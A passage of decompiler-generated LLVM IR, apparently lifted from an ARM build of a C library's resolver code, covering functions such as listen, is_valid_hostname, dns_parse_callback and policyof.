  %v1_c7d4 = add nsw i32 %v3_c7d0, -48
  store i32 %v1_c7d4, i32* @r3, align 4
  %v1_c7dc = add i32 %v4_c7b4, 1
  store i32 %v1_c7dc, i32* @r5, align 4
  %tmp19 = icmp ugt i32 %v1_c7d4, 9
  br i1 %tmp19, label %dec_label_pc_c888, label %dec_label_pc_c7e4

dec_label_pc_c7e4:                                ; preds = %dec_label_pc_c7d0
  %v1_c7e8 = load i32, i32* @r7, align 4
  %v2_c7e8 = load i32, i32* @r4, align 4
  %v5_c7e8 = mul i32 %v2_c7e8, 4
  %v6_c7e8 = add i32 %v5_c7e8, %v1_c7e8
  %v7_c7e8 = inttoptr i32 %v6_c7e8 to i32*
  store i32 %v4_c7b0, i32* %v7_c7e8, align 4
  %v0_c7f0 = load i32, i32* @r4, align 4
  br i1 %v2_c7c4, label %dec_label_pc_c7f0, label %dec_label_pc_c80c

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7e4
  %v7_c7f0 = icmp eq i32 %v0_c7f0, 1
  br i1 %v7_c7f0, label %dec_label_pc_c82c, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c7f0
  %v7_c7f8 = icmp eq i32 %v0_c7f0, 2
  br i1 %v7_c7f8, label %dec_label_pc_c844, label %dec_label_pc_c800

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8
  %v2_c800 = icmp eq i32 %v0_c7f0, 0
  br i1 %v2_c800, label %dec_label_pc_c81c, label %dec_label_pc_c858

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c7e4
  %v1_c80c = add i32 %v0_c7f0, 1
  store i32 %v1_c80c, i32* @r4, align 4
  %v7_c810 = icmp eq i32 %v1_c80c, 4
  br i1 %v7_c810, label %dec_label_pc_c888, label %dec_label_pc_c7a4

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c800
  %v3_c81c = load i32, i32* %stack_var_-44, align 4
  %v3_c820 = udiv i32 %v3_c81c, 16777216
  store i32 %v3_c820, i32* %stack_var_-44, align 4
  br label %dec_label_pc_c82c

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c7f0, %dec_label_pc_c81c
  br label %dec_label_pc_c844

dec_label_pc_c844:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c82c
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c844
  store i32 0, i32* @r2, align 4
  store i32 %v2_c77c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c860

dec_label_pc_c860:                                ; preds = %dec_label_pc_c86c.dec_label_pc_c860_crit_edge, %dec_label_pc_c858
  %v2_c86c = phi i32 [ %v1_c870, %dec_label_pc_c86c.dec_label_pc_c860_crit_edge ], [ 0, %dec_label_pc_c858 ]
  %v0_c860 = phi i32 [ %v0_c860.pre, %dec_label_pc_c86c.dec_label_pc_c860_crit_edge ], [ %v2_c77c, %dec_label_pc_c858 ]
  %v4_c860 = mul i32 %v2_c86c, 4
  %v5_c860 = add i32 %v4_c860, %v0_c860
  %v6_c860 = inttoptr i32 %v5_c860 to i32*
  %v7_c860 = load i32, i32* %v6_c860, align 4
  store i32 %v7_c860, i32* @r3, align 4
  %tmp20 = icmp ugt i32 %v7_c860, 255
  br i1 %tmp20, label %dec_label_pc_c888, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c860
  %v1_c86c = trunc i32 %v7_c860 to i8
  %v3_c86c = load i32, i32* @r8, align 4
  %v4_c86c = add i32 %v3_c86c, %v2_c86c
  %v5_c86c = inttoptr i32 %v4_c86c to i8*
  store i8 %v1_c86c, i8* %v5_c86c, align 1
  %v0_c870 = load i32, i32* @r2, align 4
  %v1_c870 = add i32 %v0_c870, 1
  store i32 %v1_c870, i32* @r2, align 4
  %v7_c874 = icmp eq i32 %v1_c870, 4
  br i1 %v7_c874, label %dec_label_pc_c888, label %dec_label_pc_c86c.dec_label_pc_c860_crit_edge

dec_label_pc_c86c.dec_label_pc_c860_crit_edge:    ; preds = %dec_label_pc_c86c
  %v0_c860.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c860

dec_label_pc_c888:                                ; preds = %dec_label_pc_c7a4, %dec_label_pc_c7d0, %dec_label_pc_c80c, %bb, %dec_label_pc_c860, %dec_label_pc_c86c
  %storemerge = phi i32 [ 1, %dec_label_pc_c86c ], [ 0, %dec_label_pc_c860 ], [ 0, %bb ], [ 0, %dec_label_pc_c80c ], [ 0, %dec_label_pc_c7d0 ], [ 0, %dec_label_pc_c7a4 ]
  store i32 %v3_c774, i32* @r4, align 4
  store i32 %v6_c774, i32* @r5, align 4
  store i32 %v9_c774, i32* @r6, align 4
  store i32 %v12_c774, i32* @r7, align 4
  store i32 %v15_c774, i32* @r8, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_c870, { 1, 2, 0 }
  uselistorder i32 %v7_c860, { 1, 0, 2 }
  uselistorder i32 %v0_c7f0, { 3, 0, 1, 2 }
  uselistorder i32 %v2_c79c, { 1, 0, 2 }
  uselistorder i8** %stack_var_-28, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_c888, { 5, 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c858, { 1, 0 }
  uselistorder label %dec_label_pc_c844, { 1, 0 }
  uselistorder label %dec_label_pc_c82c, { 1, 0 }
  uselistorder label %dec_label_pc_c7d0, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  %v3_c898 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_c8b0 = call i32 @__syscall_ret()
  store i32 %v3_c898, i32* @r4, align 4
  ret i32 %v0_c8b0
}

define i32 @scopeof(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_c8bc = load i8, i8* %arg1, align 1
  %v3_c8bc = zext i8 %v2_c8bc to i32
  store i32 %v3_c8bc, i32* %r2.global-to-local, align 4
  %v2_c8c0 = icmp eq i8 %v2_c8bc, -1
  br i1 %v2_c8c0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_c8c4 = add i32 %tmp, 1
  %v3_c8c4 = inttoptr i32 %v2_c8c4 to i8*
  %v4_c8c4 = load i8, i8* %v3_c8c4, align 1
  %tmp4 = urem i8 %v4_c8c4, 16
  %v2_c8c8 = zext i8 %tmp4 to i32
  store i32 %v2_c8c8, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_c8cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_c8c0, i32 %v0_c8cc)
  %v0_c8d0 = load i32, i32* %r2.global-to-local, align 4
  %v7_c8d0 = icmp eq i32 %v0_c8d0, 254
  %v0_c8d8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_c8d0, label %dec_label_pc_c8d8, label %dec_label_pc_c8e8

dec_label_pc_c8d8:                                ; preds = %.thread
  %v1_c8d8 = add i32 %v0_c8d8, 1
  %v2_c8d8 = inttoptr i32 %v1_c8d8 to i8*
  %v3_c8d8 = load i8, i8* %v2_c8d8, align 1
  %v1_c8dc = and i8 %v3_c8d8, -64
  %v7_c8e0 = icmp eq i8 %v1_c8dc, -128
  br i1 %v7_c8e0, label %dec_label_pc_c95c, label %dec_label_pc_c8e8

dec_label_pc_c8e8:                                ; preds = %.thread, %dec_label_pc_c8d8
  %v1_c8e8 = inttoptr i32 %v0_c8d8 to i32*
  %v2_c8e8 = load i32, i32* %v1_c8e8, align 4
  %v2_c8ec = icmp eq i32 %v2_c8e8, 0
  br i1 %v2_c8ec, label %dec_label_pc_c8f4, label %dec_label_pc_c93c

dec_label_pc_c8f4:                                ; preds = %dec_label_pc_c8e8
  %v1_c8f4 = add i32 %v0_c8d8, 4
  %v2_c8f4 = inttoptr i32 %v1_c8f4 to i32*
  %v3_c8f4 = load i32, i32* %v2_c8f4, align 4
  %v2_c8f8 = icmp eq i32 %v3_c8f4, 0
  br i1 %v2_c8f8, label %dec_label_pc_c900, label %dec_label_pc_c93c

dec_label_pc_c900:                                ; preds = %dec_label_pc_c8f4
  %v1_c900 = add i32 %v0_c8d8, 8
  %v2_c900 = inttoptr i32 %v1_c900 to i32*
  %v3_c900 = load i32, i32* %v2_c900, align 4
  %v2_c904 = icmp eq i32 %v3_c900, 0
  br i1 %v2_c904, label %dec_label_pc_c90c, label %dec_label_pc_c93c

dec_label_pc_c90c:                                ; preds = %dec_label_pc_c900
  %v1_c90c = add i32 %v0_c8d8, 12
  %v2_c90c = inttoptr i32 %v1_c90c to i8*
  %v3_c90c = load i8, i8* %v2_c90c, align 1
  %v2_c910 = icmp eq i8 %v3_c90c, 0
  br i1 %v2_c910, label %dec_label_pc_c918, label %dec_label_pc_c93c

dec_label_pc_c918:                                ; preds = %dec_label_pc_c90c
  %v1_c918 = add i32 %v0_c8d8, 13
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v2_c91c = icmp eq i8 %v3_c918, 0
  br i1 %v2_c91c, label %dec_label_pc_c924, label %dec_label_pc_c93c

dec_label_pc_c924:                                ; preds = %dec_label_pc_c918
  %v1_c924 = add i32 %v0_c8d8, 14
  %v2_c924 = inttoptr i32 %v1_c924 to i8*
  %v3_c924 = load i8, i8* %v2_c924, align 1
  %v2_c928 = icmp eq i8 %v3_c924, 0
  br i1 %v2_c928, label %dec_label_pc_c930, label %dec_label_pc_c93c

dec_label_pc_c930:                                ; preds = %dec_label_pc_c924
  %v1_c930 = add i32 %v0_c8d8, 15
  %v2_c930 = inttoptr i32 %v1_c930 to i8*
  %v3_c930 = load i8, i8* %v2_c930, align 1
  %v7_c934 = icmp eq i8 %v3_c930, 1
  br i1 %v7_c934, label %dec_label_pc_c95c, label %dec_label_pc_c93c

dec_label_pc_c93c:                                ; preds = %dec_label_pc_c924, %dec_label_pc_c918, %dec_label_pc_c90c, %dec_label_pc_c900, %dec_label_pc_c8f4, %dec_label_pc_c8e8, %dec_label_pc_c930
  br i1 %v7_c8d0, label %dec_label_pc_c944, label %dec_label_pc_c964

dec_label_pc_c944:                                ; preds = %dec_label_pc_c93c
  %v1_c944 = add i32 %v0_c8d8, 1
  %v2_c944 = inttoptr i32 %v1_c944 to i8*
  %v3_c944 = load i8, i8* %v2_c944, align 1
  %v2_c94c = icmp ugt i8 %v3_c944, -65
  br i1 %v2_c94c, label %bb2, label %bb3

bb2:                                              ; preds = %dec_label_pc_c944
  store i32 5, i32* %r0.global-to-local, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_c944, %bb2
  %v0_c954 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_c94c, i32 %v0_c954)
  br label %dec_label_pc_c964

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c930, %dec_label_pc_c8d8
  store i32 2, i32* %r0.global-to-local, align 4
  ret i32 2

dec_label_pc_c964:                                ; preds = %dec_label_pc_c93c, %bb3
  store i32 14, i32* %r0.global-to-local, align 4
  ret i32 14

; uselistorder directives
  uselistorder i32 %v0_c8d8, { 7, 6, 5, 4, 3, 2, 1, 0, 8 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_c964, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %dec_label_pc_c93c, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_c8e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @addrcmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_c96c = add i32 %arg2, 24
  %v2_c96c = inttoptr i32 %v1_c96c to i32*
  %v3_c96c = load i32, i32* %v2_c96c, align 4
  %v1_c970 = add i32 %arg1, 24
  %v2_c970 = inttoptr i32 %v1_c970 to i32*
  %v3_c970 = load i32, i32* %v2_c970, align 4
  %v2_c974 = sub i32 %v3_c96c, %v3_c970
  ret i32 %v2_c974
}

define i32 @name_from_numeric(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_c984 = call i32 @__lookup_ipliteral()
  ret i32 %v0_c984
}

define i32 @is_valid_hostname(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_c994 = load i32, i32* @r4, align 4
  store i32 %v3_c994, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_c9a0 = call i32 @strnlen(i32 %tmp, i32 255)
  %v1_c9a4 = add i32 %v3_c9a0, -1
  %tmp10 = icmp ugt i32 %v1_c9a4, 253
  br i1 %tmp10, label %dec_label_pc_ca10, label %dec_label_pc_c9b0

dec_label_pc_c9b0:                                ; preds = %entry
  store i32 0, i32* @r0, align 4
  %v0_c9b4 = load i32, i32* @r4, align 4
  store i32 %v0_c9b4, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_c9bc = call i32 @mbstowcs()
  %v7_c9c0 = icmp eq i32 %v0_c9bc, -1
  br i1 %v7_c9c0, label %dec_label_pc_ca10, label %dec_label_pc_c9d0.preheader

dec_label_pc_c9d0.preheader:                      ; preds = %dec_label_pc_c9b0
  %v0_c9d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c9d0

dec_label_pc_c9cc:                                ; preds = %dec_label_pc_c9f4, %dec_label_pc_c9d0, %dec_label_pc_c9e8
  %v0_c9cc = phi i32 [ %v0_c9d0, %dec_label_pc_c9d0 ], [ %v0_c9d0, %dec_label_pc_c9e8 ], [ %v0_ca00, %dec_label_pc_c9f4 ]
  %v1_c9cc = add i32 %v0_c9cc, 1
  store i32 %v1_c9cc, i32* @r4, align 4
  br label %dec_label_pc_c9d0

dec_label_pc_c9d0:                                ; preds = %dec_label_pc_c9d0.preheader, %dec_label_pc_c9cc
  %v0_c9d0 = phi i32 [ %v0_c9d0.pre, %dec_label_pc_c9d0.preheader ], [ %v1_c9cc, %dec_label_pc_c9cc ]
  %v1_c9d0 = inttoptr i32 %v0_c9d0 to i8*
  %v2_c9d0 = load i8, i8* %v1_c9d0, align 1
  %v3_c9d0 = zext i8 %v2_c9d0 to i32
  %v7_c9d4 = icmp eq i8 %v2_c9d0, 46
  %. = zext i1 %v7_c9d4 to i32
  %tmp11 = icmp slt i8 %v2_c9d0, 0
  %v4_c9e0 = zext i1 %tmp11 to i32
  %v5_c9e0 = or i32 %v4_c9e0, %.
  %v7_c9e0 = icmp eq i32 %v5_c9e0, 0
  br i1 %v7_c9e0, label %dec_label_pc_c9e8, label %dec_label_pc_c9cc

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9d0
  %v7_c9e8 = icmp eq i8 %v2_c9d0, 45
  br i1 %v7_c9e8, label %dec_label_pc_c9cc, label %dec_label_pc_c9f4

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c9e8
  %v1_c9f4 = call i32 @isalnum(i32 %v3_c9d0)
  %v2_c9f8 = icmp eq i32 %v1_c9f4, 0
  %v0_ca00 = load i32, i32* @r4, align 4
  br i1 %v2_c9f8, label %dec_label_pc_ca00, label %dec_label_pc_c9cc

dec_label_pc_ca00:                                ; preds = %dec_label_pc_c9f4
  %v1_ca00 = inttoptr i32 %v0_ca00 to i8*
  %v2_ca00 = load i8, i8* %v1_ca00, align 1
  %v3_ca00 = zext i8 %v2_ca00 to i32
  store i32 %v3_ca00, i32* @r3, align 4
  %v1_ca04 = sub nsw i32 1, %v3_ca00
  %v2_ca04 = icmp ult i8 %v2_ca00, 2
  br i1 %v2_ca04, label %dec_label_pc_ca14, label %bb9

bb9:                                              ; preds = %dec_label_pc_ca00
  br label %dec_label_pc_ca14

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9b0, %entry
  br label %dec_label_pc_ca14

dec_label_pc_ca14:                                ; preds = %bb9, %dec_label_pc_ca00, %dec_label_pc_ca10
  %v1_ca18 = phi i32 [ 0, %bb9 ], [ %v1_ca04, %dec_label_pc_ca00 ], [ 0, %dec_label_pc_ca10 ]
  %v2_ca14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca14, i32* @r4, align 4
  ret i32 %v1_ca18

; uselistorder directives
  uselistorder i8 %v2_c9d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c9d0, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_ca14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c9d0, { 1, 0 }
  uselistorder label %dec_label_pc_c9cc, { 0, 2, 1 }
}

define i32 @dns_parse_callback(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-272 = alloca i32, align 4
  %v7_ca20 = icmp eq i32 %arg2, 5
  store i32 %arg2, i32* @ip, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg4, i32* @lr, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v7_ca20, label %dec_label_pc_cadc, label %dec_label_pc_ca3c

dec_label_pc_ca3c:                                ; preds = %entry
  %v7_ca3c = icmp eq i32 %arg2, 28
  br i1 %v7_ca3c, label %dec_label_pc_ca88, label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca3c
  %v7_ca44 = icmp eq i32 %arg2, 1
  br i1 %v7_ca44, label %dec_label_pc_ca4c, label %dec_label_pc_cb28

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca44
  %v7_ca4c = icmp eq i32 %arg4, 4
  br i1 %v7_ca4c, label %dec_label_pc_ca54, label %dec_label_pc_cb20

dec_label_pc_ca54:                                ; preds = %dec_label_pc_ca4c
  %v1_ca54 = add i32 %tmp, 8
  %v2_ca54 = inttoptr i32 %v1_ca54 to i32*
  %v3_ca54 = load i32, i32* %v2_ca54, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v2_ca5c = mul i32 %v3_ca54, 28
  store i32 %v2_ca5c, i32* %r0.global-to-local, align 4
  %v2_ca60 = load i32, i32* %arg1, align 4
  store i32 %v2_ca60, i32* %r2.global-to-local, align 4
  %v3_ca68 = add i32 %v2_ca60, %v2_ca5c
  %v4_ca68 = inttoptr i32 %v3_ca68 to i32*
  store i32 2, i32* %v4_ca68, align 4
  %v0_ca6c = load i32, i32* @r5, align 4
  %v1_ca6c = add i32 %v0_ca6c, 8
  %v2_ca6c = inttoptr i32 %v1_ca6c to i32*
  %v3_ca6c = load i32, i32* %v2_ca6c, align 4
  %v0_ca70 = load i32, i32* %r1.global-to-local, align 4
  %v2_ca70 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca70 = mul i32 %v0_ca70, %v3_ca6c
  %v4_ca70 = add i32 %v2_ca70, %v3_ca70
  store i32 0, i32* @r4, align 4
  %v2_ca78 = add i32 %v4_ca70, 4
  %v3_ca78 = inttoptr i32 %v2_ca78 to i32*
  store i32 0, i32* %v3_ca78, align 4
  %v0_ca7c = load i32, i32* @r5, align 4
  %v1_ca7c = add i32 %v0_ca7c, 8
  %v2_ca7c = inttoptr i32 %v1_ca7c to i32*
  %v3_ca7c = load i32, i32* %v2_ca7c, align 4
  %v1_ca80 = load i32, i32* %r1.global-to-local, align 4
  %v2_ca80 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca80 = mul i32 %v1_ca80, %v3_ca7c
  %v4_ca80 = add i32 %v2_ca80, %v3_ca80
  br label %dec_label_pc_cabc

dec_label_pc_ca88:                                ; preds = %dec_label_pc_ca3c
  %v7_ca88 = icmp eq i32 %arg4, 16
  br i1 %v7_ca88, label %dec_label_pc_ca90, label %dec_label_pc_cb20

dec_label_pc_ca90:                                ; preds = %dec_label_pc_ca88
  %v1_ca90 = add i32 %tmp, 8
  %v2_ca90 = inttoptr i32 %v1_ca90 to i32*
  %v3_ca90 = load i32, i32* %v2_ca90, align 4
  %v2_ca94 = mul i32 %v3_ca90, 28
  store i32 %v2_ca94, i32* %r1.global-to-local, align 4
  %v2_ca98 = load i32, i32* %arg1, align 4
  store i32 %v2_ca98, i32* %r2.global-to-local, align 4
  %v3_caa0 = add i32 %v2_ca98, %v2_ca94
  %v4_caa0 = inttoptr i32 %v3_caa0 to i32*
  store i32 10, i32* %v4_caa0, align 4
  %v3_caa4 = load i32, i32* %v2_ca90, align 4
  %v0_caa8 = load i32, i32* @ip, align 4
  %v2_caa8 = load i32, i32* %r2.global-to-local, align 4
  %v3_caa8 = mul i32 %v0_caa8, %v3_caa4
  %v4_caa8 = add i32 %v2_caa8, %v3_caa8
  store i32 0, i32* @r4, align 4
  %v2_cab0 = add i32 %v4_caa8, 4
  %v3_cab0 = inttoptr i32 %v2_cab0 to i32*
  store i32 0, i32* %v3_cab0, align 4
  %v3_cab4 = load i32, i32* %v2_ca90, align 4
  %v1_cab8 = load i32, i32* @ip, align 4
  %v2_cab8 = load i32, i32* %r2.global-to-local, align 4
  %v3_cab8 = mul i32 %v1_cab8, %v3_cab4
  %v4_cab8 = add i32 %v2_cab8, %v3_cab8
  %v1_cac0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_ca54, %dec_label_pc_ca90
  %v1_cac0 = phi i32 [ %v0_ca7c, %dec_label_pc_ca54 ], [ %v1_cac0.pre, %dec_label_pc_ca90 ]
  %v0_cabc = phi i32 [ %v3_ca7c, %dec_label_pc_ca54 ], [ %v3_cab4, %dec_label_pc_ca90 ]
  %storemerge = phi i32 [ %v4_ca80, %dec_label_pc_ca54 ], [ %v4_cab8, %dec_label_pc_ca90 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_cabc = add i32 %v0_cabc, 1
  store i32 %v1_cabc, i32* @r3, align 4
  %v2_cac0 = add i32 %v1_cac0, 8
  %v3_cac0 = inttoptr i32 %v2_cac0 to i32*
  store i32 %v1_cabc, i32* %v3_cac0, align 4
  %v0_cac4 = load i32, i32* %r0.global-to-local, align 4
  %v1_cac4 = add i32 %v0_cac4, 8
  store i32 %v1_cac4, i32* %r0.global-to-local, align 4
  %v0_cac8 = load i32, i32* @r6, align 4
  store i32 %v0_cac8, i32* %r1.global-to-local, align 4
  %v0_cacc = load i32, i32* @lr, align 4
  store i32 %v0_cacc, i32* %r2.global-to-local, align 4
  %v3_cad0 = inttoptr i32 %v1_cac4 to i16*
  %v4_cad0 = call i32 @memcpy(i16* %v3_cad0, i32 %v0_cac8, i32 %v0_cacc)
  %v0_cad4 = load i32, i32* @r4, align 4
  store i32 %v0_cad4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb2c

dec_label_pc_cadc:                                ; preds = %entry
  store i32 %arg5, i32* %r0.global-to-local, align 4
  %v2_cae0 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_cae0, i32* @r4, align 4
  %v1_cae8 = add i32 %arg5, 512
  store i32 %v1_cae8, i32* %r1.global-to-local, align 4
  store i32 %v2_cae0, i32* @r3, align 4
  %v2_caf4 = call i32 @__dn_expand(i32 %arg5, i32 %v1_cae8)
  store i32 %v2_caf4, i32* %r0.global-to-local, align 4
  %tmp11 = icmp slt i32 %v2_caf4, 1
  br i1 %tmp11, label %dec_label_pc_cb28, label %dec_label_pc_cb00

dec_label_pc_cb00:                                ; preds = %dec_label_pc_cadc
  store i32 %v2_cae0, i32* %r0.global-to-local, align 4
  %v1_cb04 = bitcast i32* %stack_var_-272 to i8*
  %v2_cb04 = call i32 @is_valid_hostname(i8* %v1_cb04)
  store i32 %v2_cb04, i32* %r0.global-to-local, align 4
  %v2_cb08 = icmp eq i32 %v2_cb04, 0
  br i1 %v2_cb08, label %dec_label_pc_cb28, label %dec_label_pc_cb10

dec_label_pc_cb10:                                ; preds = %dec_label_pc_cb00
  %v0_cb10 = load i32, i32* @r5, align 4
  %v1_cb10 = add i32 %v0_cb10, 4
  %v2_cb10 = inttoptr i32 %v1_cb10 to i32*
  %v3_cb10 = load i32, i32* %v2_cb10, align 4
  store i32 %v3_cb10, i32* %r0.global-to-local, align 4
  store i32 %v2_cae0, i32* @r1, align 4
  %v2_cb18 = call i32 @strcpy(i32 %v3_cb10, i32 %v2_cae0)
  store i32 %v2_cb18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb28

dec_label_pc_cb20:                                ; preds = %dec_label_pc_ca88, %dec_label_pc_ca4c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb2c

dec_label_pc_cb28:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_cb00, %dec_label_pc_cadc, %dec_label_pc_cb10
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb2c

dec_label_pc_cb2c:                                ; preds = %dec_label_pc_cb20, %dec_label_pc_cabc, %dec_label_pc_cb28
  %v1_cb34 = phi i32 [ -1, %dec_label_pc_cb20 ], [ %v0_cad4, %dec_label_pc_cabc ], [ 0, %dec_label_pc_cb28 ]
  ret i32 %v1_cb34

; uselistorder directives
  uselistorder i32 %v2_cae0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_cab4, { 1, 0 }
  uselistorder i32 %v3_ca7c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 1, 2, 13, 0 }
  uselistorder i32 %arg5, { 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 3, 1, 4 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb28, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0 }
}

define i32 @policyof(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_19c81.484 to i32), i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 20, i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19c81.484 to i32), i32* %sb.global-to-local, align 4
  br label %dec_label_pc_cb54

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb98, %entry
  %v0_cb60 = phi i32 [ %v0_cb60.pre, %dec_label_pc_cb98 ], [ %arg1, %entry ]
  %v1_cb5c = phi i32 [ %v1_cb5c.pre, %dec_label_pc_cb98 ], [ ptrtoint (i32* @global_var_19c81.484 to i32), %entry ]
  %v0_cb58 = phi i32 [ %v1_cb98, %dec_label_pc_cb98 ], [ ptrtoint (i32* @global_var_19c81.484 to i32), %entry ]
  %v1_cb54 = phi i32 [ %v1_cb54.pre, %dec_label_pc_cb98 ], [ 20, %entry ]
  %v0_cb54 = phi i32 [ %v1_cb78, %dec_label_pc_cb98 ], [ 0, %entry ]
  %v2_cb54 = mul i32 %v0_cb54, %v1_cb54
  store i32 %v2_cb54, i32* %r4.global-to-local, align 4
  %v1_cb58 = add i32 %v0_cb58, 16
  %v2_cb58 = inttoptr i32 %v1_cb58 to i8*
  %v3_cb58 = load i8, i8* %v2_cb58, align 1
  %v4_cb58 = zext i8 %v3_cb58 to i32
  store i32 %v4_cb58, i32* %r5.global-to-local, align 4
  %v2_cb5c = add i32 %v2_cb54, %v1_cb5c
  store i32 %v2_cb5c, i32* %r7.global-to-local, align 4
  %v3_cb6c = inttoptr i32 %v0_cb60 to i8*
  %v4_cb6c = call i32 @memcmp(i8* %v3_cb6c, i32 %v2_cb5c, i32 %v4_cb58)
  %v2_cb70 = icmp eq i32 %v4_cb6c, 0
  %v0_cb74 = load i32, i32* %r4.global-to-local, align 4
  %v1_cb74 = load i32, i32* %r5.global-to-local, align 4
  %v2_cb74 = add i32 %v1_cb74, %v0_cb74
  store i32 %v2_cb74, i32* %r4.global-to-local, align 4
  %v0_cb78 = load i32, i32* %r8.global-to-local, align 4
  %v1_cb78 = add i32 %v0_cb78, 1
  store i32 %v1_cb78, i32* %r8.global-to-local, align 4
  %v0_cb80 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_cb70, label %dec_label_pc_cb80, label %dec_label_pc_cb54.dec_label_pc_cb98_crit_edge

dec_label_pc_cb54.dec_label_pc_cb98_crit_edge:    ; preds = %dec_label_pc_cb54
  %v1_cb5c.pre.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_cb60.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cb98

dec_label_pc_cb80:                                ; preds = %dec_label_pc_cb54
  %v1_cb80 = add i32 %v0_cb80, 17
